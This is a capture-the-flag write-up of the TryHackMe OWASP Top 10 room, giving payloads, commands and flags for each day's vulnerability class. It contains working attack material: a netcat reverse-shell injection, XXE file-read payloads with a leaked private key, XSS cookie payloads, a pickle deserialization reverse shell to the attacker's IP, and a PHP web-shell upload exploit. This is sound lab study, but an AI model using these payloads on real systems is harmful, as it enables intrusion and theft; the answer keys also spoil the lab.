---
description: 'https://tryhackme.com/room/owasptop10'
---

# \[Writeups\] THM – OWASP Top 10 Challenge for 10 Days

## **Day 1 – OS Command Injection**

Command Injection occurs when server-side code \(like PHP\) in a web application makes a system call on the hosting machine. It is a web vulnerability that allows an attacker to take advantage of that made system call to execute operating system commands on the server. Sometimes this won't always end in something malicious, like a _`whoami`_or just reading of files. That isn't too bad. But the thing about command injection is it opens up many options for the attacker. The worst thing they could do would be to spawn a reverse shell to become the user that the webserver is running as. 

A simple `;nc -e /bin/bash` is all that's needed and they own your server. some variants of `netcat` don't support the -e option. You can use a list of these reverse shells as an alternative.

Once the attacker has a foothold on the web server, they can start the usual enumeration of your systems and start looking for ways to pivot around. Now that we know what command injection is, we'll start going into the different types and how to test for them.

**What is Active Command Injection?**

Blind command injection occurs when the system command made to the server does not return the response to the user in the HTML document. Active command injection will return the response to the user. It can be made visible through several HTML elements.

_**\#1. What strange text file is in the website root directory?**_

Using the`ls -l` command I can see all of the files in root directory. Then, I’ve got a file name `drpepper.txt`.

_**\#2. How many non-root/non-service/non-daemon users are there?**_

In this, I’ve used this command: `compgen -u | wc -l`.

* compgen is bash built-in command and it will show all available commands, aliases, and functions for you
* -u: means names of userAlias names
* wc stands for word count. As the name implies, it is mainly used for counting purpose.
* -**l:** This option prints the **number of lines** present in a file. With this option wc command displays two-columnar output, 1st column shows the number of lines present in a file, and 2nd itself represents the file name.

_**\#3. What user is this app running as?**_

Using `id` command then I’ve got `www-data`

_**\#4. What is the user's shell set as?**_

I’ve tried to this command `less /etc/passwd` to show all of the users in the system, then I got users’ shell set as `/usr/sbin/nologin`.

_**\#5. What version of Ubuntu is running?**_

Using the `lsb_release -a` command to show some information about the system then I’ve got “Distributor ID: Ubuntu Description: Ubuntu 18.04.4 LTS Release: 18.04 Codename: bionic”.

_**\#6. Print out the MOTD. What favorite beverage is shown?**_

motd also is known as "Message Of The Day" daemon. The motd message can be customized to fit the individual needs of each user or administrator by modifying the `/etc/motd` file or script within the `/etc/update-motd.d`directory.

I’ve tried `ls /etc/update-motd.d/` then I got `00-header 10-help-text 50-landscape-sysinfo 50-motd-news 80-esm 80-livepatch 90-updates-available 91-release-upgrade 92-unattended-upgrades 95-hwe-eol 97-overlayroot 98-fsck-at-reboot 98-reboot-required`

Then, I’ve used `cat /etc/update-motd.d/00-header` to show all of the information in `00-header`, so I got it `#!/bin/sh # # 00-header - create the header of the MOTD # Copyright (C) 2009-2010 Canonical Ltd. # # Authors: Dustin Kirkland # # This program is free software; you can redistribute it and/or modify # it under the terms of the GNU General Public License as published by # the Free Software Foundation; either version 2 of the License, or # (at your option) any later version. # # This program is distributed in the hope that it will be useful, # but WITHOUT ANY WARRANTY; without even the implied warranty of # MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the # GNU General Public License for more details. # # You should have received a copy of the GNU General Public License along # with this program; if not, write to the Free Software Foundation, Inc., # 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA. [ -r /etc/lsb-release ] && . /etc/lsb-release if [ -z "$DISTRIB_DESCRIPTION" ] && [ -x /usr/bin/lsb_release ]; then # Fall back to using the very slow lsb_release utility DISTRIB_DESCRIPTION=$(lsb_release -s -d) fi printf "Welcome to %s (%s %s %s)\n" "$DISTRIB_DESCRIPTION" "$(uname -o)" "$(uname -r)" "$(uname -m)"` **`DR PEPPER`** `MAKES THE WORLD TASTE BETTER!`

## **Day 2 – Broken Authentication**

Authentication and session management constitute the core components of modern web applications. Authentication allows users to gain access to web applications by verifying their identities. The most common form of authentication is using a username and password mechanism. A user would enter these credentials, the server would verify them. If they are correct, the server would then provide the users’ browser with a session cookie. A session cookie is needed because web servers use HTTP\(S\) to communicate which is stateless. Attaching session cookies means that the server will know who is sending what data. The server can then keep track of the users' actions.

* _**Brute force attacks**_: If a web application uses usernames and passwords, an attacker is able to launch brute force attacks that allow them to guess the username and passwords using multiple authentication attempts.
* _**Use of weak credentials**_: web applications should set strong password policies. If applications allow users to set passwords such as ‘password1’ or common passwords, then an attacker is able to easily guess them and access user accounts. They can do this without brute-forcing and multiple attempts.
* _**Weak Session Cookies**_: Session cookies are how the server keeps track of users. If session cookies contain predictable values, an attacker can set their own session cookies and access users’ accounts.

There can be various mitigation for broken authentication mechanisms depending on the exact flaw:

* To avoid password guessing attacks, ensure the application enforces a strong password policy.
* To avoid brute force attacks, ensure that the application enforces an automatic lockout after a certain number of attempts. This would prevent an attacker from launching more brute force attacks.
* Implement Multi-Factor Authentication - If a user has multiple methods of authentication, for example, using username and passwords and receiving a code on their mobile device, then it would be difficult for an attacker to get access to both credentials to get access to their account.

## **Day 3 – Sensitive Data Exposure**

When a web app accidentally divulges sensitive data, we refer to it as "Sensitive Data Exposure". This is often data directly linked to customers \(e.g. names, dates-of-birth, financial information, etc\), but could also be more technical information, such as usernames and passwords. At more complex levels this often involves techniques such as a "Man in The Middle Attack", whereby the attacker would force user connections through a device which they control, then take advantage of weak encryption on any transmitted data to gain access to the intercepted information \(if the data is even encrypted in the first place...\). Of course, many examples are much simpler, and vulnerabilities can be found in web apps which can be exploited without any advanced networking knowledge. Indeed, in some cases, sensitive data can be found directly on the webserver itself...

\#_**1. Have a look around the web app. The developer has left themselves a note indicating that there is sensitive data in a specific directory. What is the name of the mentioned directory?**_

Open source code then I’ve got `<!-- Must remember to do something better with the database than store it in /assets... -->`

_**\#2. Navigate to the directory you found in question one. What file stands out as being likely to contain sensitive data?**_

I’ve tried to access this URL “/assets” then I saw some local file in the database and had a webapp.db file.

\#3. Use the supporting material to access sensitive data. What is the password hash of the admin user?

I downloaded that file then using the “sqlite3” tool to open the file following these steps:

1. Sqlite3 webapp.db \(access to webapp.db\)
2. .tables \(show all of the tables\), then I got 2 tables.
3. SELECT \* FROM users; \(show all of the information in the users table\)

* 6eea9b7ef19179a06954edd0f6c05ceb

_**\#4. Crack the hash. What is the admin's plaintext password?**_

Then, using [https://crackstation.net/](https://crackstation.net/) tool to crack the hash password. =&gt; `qwertyuiop`

_**\#5. Log in as the admin. What is the flag?**_

Finally, I got the flag `THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}`

## **Day 4 – XML External Entity**

![](.gitbook/assets/0.png)

An XML External Entity \(XXE\) attack is a vulnerability that abuses features of XML parsers/data. It often allows an attacker to interact with any backend or external systems that the application itself can access and can allow the attacker to read the file on that system. They can also cause Denial of Service \(DoS\) attack or could use XXE to perform Server-Side Request Forgery \(SSRF\) inducing the web application to make requests to other applications. XXE may even enable port scanning and lead to remote code execution.

There are two types of XXE attacks: in-band and out-of-band \(OOB-XXE\).

1. An in-band XXE attack is the one in which the attacker can receive an immediate response to the XXE payload.
2. out-of-band XXE attacks \(also called blind XXE\), there is no immediate response from the web application and attacker has to reflect the output of their XXE payload to some other file or their own server.

**What is XML?**

XML \(eXtensible Markup Language\) is a markup language that defines a set of rules for encoding documents in a format that is both human-readable and machine-readable. It is a markup language used for storing and transporting data.

**Why we use XML?**

1. XML is platform-independent and programming language independent, thus it can be used on any system and supports the technology change when that happens.
2. The data stored and transported using XML can be changed at any point in time without affecting the data presentation.
3. XML allows validation using DTD and Schema. This validation ensures that the XML document is free from any syntax error.
4. XML simplifies data sharing between various systems because of its platform-independent nature. XML data doesn’t require any conversion when transferred between different systems.

**What is DTD?**

DTD stands for Document Type Definition. A DTD defines the structure and the legal elements and attributes of an XML document.

&lt;!DOCTYPE note \[ &lt;!ELEMENT note \(to,from,heading,body\)&gt; &lt;!ELEMENT to \(\#PCDATA\)&gt; &lt;!ELEMENT from \(\#PCDATA\)&gt; &lt;!ELEMENT heading \(\#PCDATA\)&gt; &lt;!ELEMENT body \(\#PCDATA\)&gt; \]&gt;

* !DOCTYPE note - Defines a root element of the document named note
* !ELEMENT note - Defines that the note element must contain the elements: "to, from, heading, body"
* !ELEMENT to - Defines the **to** element to be of type "\#PCDATA"
* !ELEMENT from - Defines the **from** element to be of type "\#PCDATA"
* !ELEMENT heading - Defines the **heading** element to be of type "\#PCDATA"
* !ELEMENT body - Defines the body **element** to be of type "\#PCDATA"

**Payload:**

```markup
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>
```

_**\#3 What is the name of the user in /etc/passwd**_

**Payload**

```markup
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>
```

```http
root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/us
r/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:
/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:
5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache
/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nolog
inmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/va
r/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:
/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-d
ata:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:ba
ckup:/var/backups:/usr/sbin/nologinlist:x:38:38:MailingListManag
er:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/us
r/sbin/nologingnats:x:41:41:GnatsBug-ReportingSystem(admin):/var
/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexis
tent:/usr/sbin/nologinsystemd-network:x:100:102:systemdNetworkMa
nagement,,,:/run/systemd/netif:/usr/sbin/nologinsystemd-resolve:
x:101:103:systemdResolver,,,:/run/systemd/resolve:/usr/sbin/nolo
ginsyslog:x:102:106::/home/syslog:/usr/sbin/nologinmessagebus:x:
103:107::/nonexistent:/usr/sbin/nologin_apt:x:104:65534::/nonexi
stent:/usr/sbin/nologinlxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologindnsmasq:x:107:65534
:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologinlandscape:x:108:112::
/var/lib/landscape:/usr/sbin/nologinsshd:x:109:65534::/run/sshd:
/usr/sbin/nologinpollinate:x:110:1::/var/cache/pollinate:/bin/fa
lsefalcon:x:1000:1000:falcon,,,:/home/falcon:/bin/bash
```

Flag: `falcon`

_**\#4 Where is falcon's SSH key located?**_

We first need to know where the SSH key is stored on a Linux machine. After some googling, I found the exact location and file in which this key is stored and that is `/home/<username>/.ssh/id_rsa`

Flag: `/home/falcon/.ssh/id_rsa`

_**\#5 What are the first 18 characters for falcon's private key**_

**Payload**

```bash
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///home/falcon/.ssh/id_rsa'>]>
<root>&read;</root>
```

```bash
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEA7bq7Uj0ZQzFiWzKc81OibYfCGhA24RYmcterVvRvdxw0IVSC
lZ9oM4LiwzqRIEbed7/hAA0wu6Tlyy+oLHZn2i3pLur07pxb0bfYkr7r5DaKpRPB
2Echy67MiXAQu/xgHd1e7tST18B+Ubnwo4YZNxQa+vhHRx4G5NLRL8sT+Vj9atKN
MfJmbzClgOKpTNgBaAkzY5ueWww9g0CkCldOBCM38nkEwLJAzCKtaHSreXFNN2hQ
IGfizQYRDWH1EyDbaPmvZmy0lEELfMR18wjYF1VBTAl8PNCcqVVDaKaIrbnshQpO
HoqIKrf3wLn4rnU9873C3JKzX1aDP6q+P+9BlwIDAQABAoIBABnNP5GAciJ51KwD
RUeflyx+JJIBmoM5jTi/sagBZauu0vWfH4EvyPZ2SThZPfEb3/9tQvVneReUoSA5
bu5Md58Vho6CD81qCQktBAOBV0bwqIGcMFjR95gMw8RS9m4AyUnUgf438kfja5Jh
NP36ivgQZZFBqzLLzoG9Y9jlGKjiSyMvW4u63ZacCKPTpp5P53794/UVU7JiM03y
OvavZ2QveJp5BndV5lOkcIEFwFRACDK1xwzDRzx/TNJLufztb2EheMc3stNuOMea
TLKlbG0Mp/c2az8vNN6HA0QiwxYlKZ58RfdsOfbsFxAltYNnzxy9UEieXtrWVg7X
Qfi/ZeECgYEA/pfgg6BClEmipXv8hVkLWe7VwlFf4RXnxfWyi6OqC/3Yt9Q9B4Ya
6bgLzk2vPNHgJt+g2yh/TzMX6sCC9IMYedc0faiJr/VISBm25qTjqIGctwt0D3nb
j60mSKKFbwDPxrcek/7WH1cWDcaLTDdL9KPLk1JQzbwDzojrE1TDD+cCgYEA7wsA
MPm4aUDikZHKhQ5OOge+wzPNXVR6Yy1VV3WZfxRCoEuq6fYEJsKB5tykfQPC8cUn
qwGvo8TiMHbQ9KmI5FabfBK8LswQ575bnLtMxdPyBCgYqlsAIkPYQAOizUVlrOOg
faKF5VknsONM9DC3ZNx5L1zQXbsIrWbEPsRlytECgYB7CXr/IZwLfeqUfu7yoq3R
sJKtbhYf+S4hhTPcOCQd13e8n10/HZg0CzXpZbGieusQ3lIml9Ouusp8ML0Y3aIe
f9pmP+UKnEdqUMMLg/RhowHRlD9qm0F4lf1CbQh/NK01I5ore6SPUM7fqWv4UWDr
wZzIfad/RbWxQooYtYXvUQKBgFDLcBIdpYX1x16aX1AfqLMWgRSrQqNj9UXmQa0g
83OvXmGdkbQoUfjjz1I/i10x00cycxjqpfn9htIIptG7J6i92SnTj0Vl9eTOQ1qz
N9y5qVhcURHrVh0+vy3LzNACv73y5gDw2L7PJoo0GYODn8j4eAFZJpg3qlQpovTw
HtOxAoGABqwywFKFNTYgrl17Rs4g3H1nc0EhOzGetRaRL2bcvQsZevuWyswp0Mbm
9nlgNAtxttsmfL+OU7nP3I4YQlyZed4luRWcRaXrvGMqfEL4wzRez5ZxMnZM/IlQ
9DBlD9C7t5MI3aXR3A5zFVVINomwHH7aGfeha1JRXXAtasLTVvA=
-----END RSA PRIVATE KEY-----
```

Flag: `MIIEogIBAAKCAQEA7b`

## **Day 5 – Broken Access Control**

IDOR, or Insecure Direct Object Reference, is the act of exploiting a misconfiguration in the way user input is handled, to access resources you wouldn't ordinarily be able to access. IDOR is a type of access control vulnerability.

Flag: [http://10.10.181.221/note.php?note=0](http://10.10.181.221/note.php?note=0)

## **Day 6 –** Security Misconfiguration

Security misconfiguration can happen at any level of an application stack, including the network services, platform, web server, application server, database, frameworks, custom code, and pre-installed virtual machines, containers, or storage. Automated scanners are useful for detecting misconfigurations, use of default accounts or configurations, unnecessary services, legacy options, etc.

Attackers will often attempt to exploit unpatched flaws or access default accounts, unused pages, unprotected files and directories, etc..., to gain unauthorized access or knowledge of the system

Security misconfigurations include:

* Poorly configured permissions on cloud services, like S3 buckets
* Having unnecessary features enabled, like services, pages, accounts or privileges
* Default accounts with unchanged passwords
* Error messages that are overly detailed and allow an attacker to find out more about the system
* Not using [HTTP security headers](https://owasp.org/www-project-secure-headers/), or revealing too much detail in the Server: HTTP header

This vulnerability can often lead to more vulnerabilities, such as default credentials giving you access to sensitive data, XXE or command injection on admin pages. For more information [https://owasp.org/www-project-top-ten/OWASP\_Top\_Ten\_2017/Top\_10-2017\_A6-Security\_Misconfiguration](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A6-Security_Misconfiguration)

_**\#2 Hack into the web app, and find the flag!**_

> _**Hint:**_ Can you find the app's source code? Maybe the documentation gives you default credentials that you can try.

  
****After a while looking for the flag in the source code. I've tried to find the name of the app in the Github. People sometimes use GitHub to store their web apps' source code and documentation, then I found a repo [https://github.com/NinjaJc01/PensiveNotes](https://github.com/NinjaJc01/PensiveNotes). Look at the README.md file I could see the credential

Flag: `thm{4b9513968fd564a87b28aa1f9d672e17}`

## **Day 7 –** Cross-site Scripting \(XSS\)

Cross-site scripting, also known as XSS is a security vulnerability typically found in web applications. It’s a type of injection that can allow an attacker to execute malicious scripts and have it execute on a victim’s machine.

A web application is vulnerable to XSS if it uses unsanitized user input. XSS is possible in JavaScript, VBScript, Flash, and CSS. There are three main types of cross-site scripting:

#### XSS Payloads

Remember, cross-site scripting is a vulnerability that can be exploited to execute malicious JavaScript on a victim’s machine. Check out some common payloads types used:

* Popup's \(`alert(&#x201C;Hello World&#x201D;)`\) - Creates a Hello World message popup on a users browser. Writing HTML \(`document.write`\) - Override the website's HTML to add your own \(essentially defacing the entire page\). 
* XSS Keylogger \([http://www.xss-payloads.com/payloads/scripts/simplekeylogger.js.html](http://www.xss-payloads.com/payloads/scripts/simplekeylogger.js.html)\) - You can log all keystrokes of a user, capturing their password and other sensitive information they type into the webpage. 
* Port scanning \([http://www.xss-payloads.com/payloads/scripts/portscanapi.js.html](http://www.xss-payloads.com/payloads/scripts/portscanapi.js.html)\) - A mini local port scanner \(more information on this is covered in the TryHackMe XSS room\). 
* XSS-Payloads.com \([http://www.xss-payloads.com/](http://www.xss-payloads.com/)\) is a website that has XSS related Payloads, Tools, Documentation and more. You can download XSS payloads that take snapshots from a webcam or even get a more capable port and network scanner.



#### _\#2 Go to_ `http://MACHINE_IP/reflected` _``and craft a reflected XSS payload that will cause a popup saying "Hello"._

Payload: `<script>alert("Hello")</script>`

#### _\#3 On the same reflective page, craft a reflected XSS payload that will cause a popup with your machines IP address._

Payload: `alert(window.location.hostname)`

#### _\#4 Now navigate to_ `http://MACHINE_IP/stored`_and make an account. Then add a comment and see if you can insert some of your own HTML._

Payload: `document.querySelector('code').textContent =thanks`

#### _\#5 On the same page, create an alert popup box appear on the page with your document cookies._

Payload: `<script>alert(document.cookie)</script>`

#### _\#6 Change "XSS Playground" to "I am a hacker" by adding a comment and using JavaScript._

Payload: `document.querySelector('#thm-title').textContent = 'I am a hacker'`

## **Day 8 –** Insecure Deserialization

"Insecure Deserialization is a vulnerability which occurs when untrusted data is used to abuse the logic of an application" \(Acunetix., 2017\)

This definition is still quite broad, to say the least. Simply, insecure deserialization is replacing data processed by an application with malicious code; allowing anything from DoS \(Denial of Service\) to RCE \(Remote Code Execution\) that the attacker can use to gain a foothold in a pentesting scenario.

Specifically, this malicious code leverages the legitimate serialization and deserialization process used by web applications. We'll be explaining this process and why it is so commonplace in modern web applications.

* Low exploitability. This vulnerability is often a case-by-case basis - there is no reliable tool/framework for it. Because of its nature, attackers need to have a good understanding of the inner-workings of the ToE.
* The exploit is only as dangerous as the attacker's skill permits, more so, the value of the data that is exposed. For example, someone who can only cause a DoS will make the application unavailable. The business impact of this will vary on the infrastructure - some organisations will recover just fine, others, however, will not.

#### What's Vulnerable?

At summary, ultimately, any application that stores or fetches data where there are no validations or integrity checks in place for the data queried or retained. A few examples of applications of this nature are:

* E-Commerce Sites
* Forums
* API's
* Application Runtimes \(Tomcat, Jenkins, Jboss, etc\)

#### Objects

A prominent element of object-oriented programming \(OOP\), objects are made up of two things:

* State
* Behaviour

Simply, objects allow you to create similar lines of code without having to do the leg-work of write all lines of code.

For example, a lamp would be a good object. Lamps can have different types of bulbs, this would be their state, as well as being either on/off - their behaviour!

Rather than having to accommodate every type of bulb and whether or not that specific lamp is on or off, you can use methods to simply alter the state and behavior of the lamp.

#### De\(Serialization\)

Serialization is the process of converting objects used in programming into simpler, compatible formatting for transmitting between systems or networks for further processing or storage.

Alternatively, deserialization is the reverse of this; converting serialized information into their complex form - an object that the application will understand.

_Simply, insecure deserialization occurs when data from an untrusted party \(I.e. a hacker\) gets executed because there is no filtering or input validation; the system assumes that the data is trustworthy and will execute it no holds barred._

#### Cookies 101

Cookies are an essential tool for modern websites to function. Tiny pieces of data, these are created by a website and stored on the user's computer.

Websites use these cookies to store user-specific behaviours like items in their shopping cart or session IDs.

Whilst plaintext credentials is a vulnerability in itself, it is not insecure deserialization as we have not sent any serialized data to be executed!

Cookies are not permanent storage solutions like databases. Some cookies such as session ID's will clear when the browser is closed, others, however, last considerably longer. This is determined by the "Expiry" timer that is set when the cookie is created.

#### Some cookies have additional attributes, a small list of these are below:

| Attribute | Description | Required? |
| :--- | :--- | :--- |
| Cookie Name | The Name of the Cookie to be set | Yes |
| Cookie Value | Value, this can be anything plaintext or encoded  | Yes |
| Secure Only | If set, this cookie will only be set over HTTPS connections | No  |
| Expiry | Set a timestamp where the cookie will be removed from the browser | No  |
| Path | The cookie will only be sent if the specified URL is within the request | No |

Cookies can be set in various website programming languages. For example, Javascript, PHP or Python to name a few. The following web application is developed using Python's Flask, so it is fitting to use it as an example.

![Setting cookies in Flask](.gitbook/assets/capture.png)

Setting cookies in Flask is rather trivial. Simply, this snippet gets the current date and time, stores it within the variable "timestamp" and then stores the date and time in a cookie named "registrationTimestamp". This is what it will look like in the browser.

Cookies Practical

_**\#1st flag \(cookie value\)**_

Look at the cookie then decode base64 cookie then I got the flag

Flag: `THM{good_old_base64_huh}`

_**\#2st flag \(admin dashboard\)**_

Direct to [http://MACHINE\_IP/admin](http://10.10.104.96/admin) to get the flag

Flag: `THM{heres_the_admin_flag}`

#### Remote Code Execution \(RCE\)

_**\#1 flag.txt**_

Just follow the guide in the room -\_-

```bash
root@kali:~# nc -lvnp 4444
```

```python
// this is content of rce.py
import pickle
import sys
import base64

command = 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | netcat YOUR_TRYHACKME_VPN_IP 4444 > /tmp/f'

class rce(object):
    def __reduce__(self):
        import os
        return (os.system,(command,))

print(base64.b64encode(pickle.dumps(rce())))
```

```bash
root@kali:~! python3 rce.py
```

After run `rce.py` file I've got shell then look for flag.txt in `/home/cmnatic/flag.txt`

Flag: `4a69a7ff9fd68`

## Day 9 - Components With Known Vulnerabilities

Occasionally, you may find that the company/entity that you're pen-testing is using a program that already has a well-documented vulnerability.

For example, let's say that a company hasn't updated their version of WordPress for a few years, and using a tool such as wpscan, you find that it's version 4.6. Some quick research will reveal that WordPress 4.6 is vulnerable to an unauthenticated remote code execution \(RCE\) exploit, and even better you can find an exploit already made on exploit-db.

As you can see this would be quite devastating, because it requires very little work on the part of the attacker as often times since the vulnerability is already well known, someone else has made an exploit for the vulnerability. The situation becomes even worse when you realize, that it's really quite easy for this to happen, if a company misses a single update for a program they use, they could be vulnerable to any number of attacks.

Hence, why OWASP has rated this a 3 \(meaning high\) on the prevalence scale, it is incredibly easy for a company to miss an update for an application.

Based on that, in this case we can found an exploit in [exploit-db](https://www.exploit-db.com/) and try to attack the target to get the shell

_**\#1 How many characters are in /etc/passwd \(use wc -c /etc/passwd to get the answer\)**_

Following the guide, I've found a exploit in  [exploit-db](https://www.exploit-db.com/exploits/47887) by searching "Unauthenticated Remote Code Execution" . Then I've got this code then save it as rce.py and run it.

```python
import argparse
import random
import requests
import string
import sys

parser = argparse.ArgumentParser()
parser.add_argument('url', action='store', help='The URL of the target.')
args = parser.parse_args()

url = args.url.rstrip('/')
random_file = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(10))

payload = '<?php echo shell_exec($_GET[\'cmd\']); ?>'

file = {'image': (random_file + '.php', payload, 'text/php')}
print('> Attempting to upload PHP web shell...')
r = requests.post(url + '/admin_add.php', files=file, data={'add':'1'}, verify=False)
print('> Verifying shell upload...')
r = requests.get(url + '/bootstrap/img/' + random_file + '.php', params={'cmd':'echo ' + random_file}, verify=False)

if random_file in r.text:
    print('> Web shell uploaded to ' + url + '/bootstrap/img/' + random_file + '.php')
    print('> Example command usage: ' + url + '/bootstrap/img/' + random_file + '.php?cmd=whoami')
    launch_shell = str(input('> Do you wish to launch a shell here? (y/n): '))
    if launch_shell.lower() == 'y':
        while True:
            cmd = str(input('RCE $ '))
            if cmd == 'exit':
                sys.exit(0)
            r = requests.get(url + '/bootstrap/img/' + random_file + '.php', params={'cmd':cmd}, verify=False)
            print(r.text)
else:
    if r.status_code == 200:
        print('> Web shell uploaded to ' + url + '/bootstrap/img/' + random_file + '.php, however a simple command check failed to execute. Perhaps shell_exec is disabled? Try changing the payload.')
    else:
        print('> Web shell failed to upload! The web server may not have write permissions.')
```

```bash
root@kali:~! python rce.py [url]  // url means url of your target
```

Finally, I've got the shell. I've used `wc /etc/password` to counts the number of characters, words and lines. The example here is trying to see how many entries in `/etc/passwd`

```bash
> Attempting to upload PHP web shell...
> Verifying shell upload...
> Web shell uploaded to http://10.10.90.249/bootstrap/img/TVgBS1aAhU.php
> Example command usage: http://10.10.90.249/bootstrap/img/TVgBS1aAhU.php?cmd=whoami
> Do you wish to launch a shell here? (y/n): y
RCE $ wc /etc/passwd
  31   40 1611 /etc/passwd
```

Flag: `1611`

## Day 10 - Insufficient Logging and Monitoring

When web applications are set up, every action performed by the user should be logged. Logging is important because in the event of an incident, the attackers actions can be traced. Once their actions are traced, their risk and impact can be determined. Without logging, there would be no way to tell what actions an attacker performed if they gain access to particular web applications. The bigger impacts of these include:

* _**regulatory damage**_: if an attacker has gained access to personally identifiable user information and there is no record of this, not only are users of the application affected, but the application owners may be subject to fines or more severe actions depending on regulations.
* _**risk of further attacks**_: without logging, the presence of an attacker may be undetected. This could allow an attacker to launch further attacks against web application owners by stealing credentials, attacking infrastructure and more.

The information stored in logs should include:

* HTTP status codes
* Time Stamps
* Usernames
* API endpoints/page locations
* IP addresses

These logs do have some sensitive information on them so its important to ensure that logs are stored securely and multiple copies of these logs are stored at different locations.

As you may have noticed, logging is more important after a breach or incident has occurred. The ideal is case is having monitoring in place to detect any suspicious activity. The aim of detecting this suspicious activity is to either stop the attacker completely or reduce the impact they've made if their presence has been detected much later than anticipated. Common examples of suspicious activity includes:

* multiple unauthorised attempts for a particular action \(usually authentication attempts or access to unauthorised resources e.g. admin pages\)
* requests from anomalous IP addresses or locations: while this can indicate that someone else is trying to access a particular user's account, it can also have a false positive rate.
* use of automated tools: particular automated tooling can be easily identifiable e.g. using the value of User-Agent headers or the speed of requests. This can indicate an attacker is using automated tooling.
* common payloads: in web applications, it's common for attackers to use Cross Site Scripting \(XSS\) payloads. Detecting the use of these payloads can indicate the presence of someone conducting unauthorised/malicious testing on applications.

Just detecting suspicious activity isn't helpful. This suspicious activity needs to be rated according to the impact level. For example, certain actions will higher impact than others. These higher impact actions need to be responded to sooner thus they should raise an alarm which raises the attention of the relevant party.

_**\#1 What IP address is the attacker using?**_

```http
// login-logs.txt
200 OK           12.55.22.88 jr22          2019-03-18T09:21:17 /login
200 OK           14.56.23.11 rand99        2019-03-18T10:19:22 /login
200 OK           17.33.10.38 afer11        2019-03-18T11:11:44 /login
200 OK           99.12.44.20 rad4          2019-03-18T11:55:51 /login
200 OK           67.34.22.10 bff1          2019-03-18T13:08:59 /login
200 OK           34.55.11.14 hax0r         2019-03-21T16:08:15 /login
401 Unauthorised 49.99.13.16 admin         2019-03-21T21:08:15 /login
401 Unauthorised 49.99.13.16 administrator 2019-03-21T21:08:20 /login
401 Unauthorised 49.99.13.16 anonymous     2019-03-21T21:08:25 /login
401 Unauthorised 49.99.13.16 root          2019-03-21T21:08:30 /login 
```

Flag: `49.99.13.16`

_**\#2 What kind of attack is being carried out?**_

Flag: ****`brute force`  
****







_\*\*\*\*_

















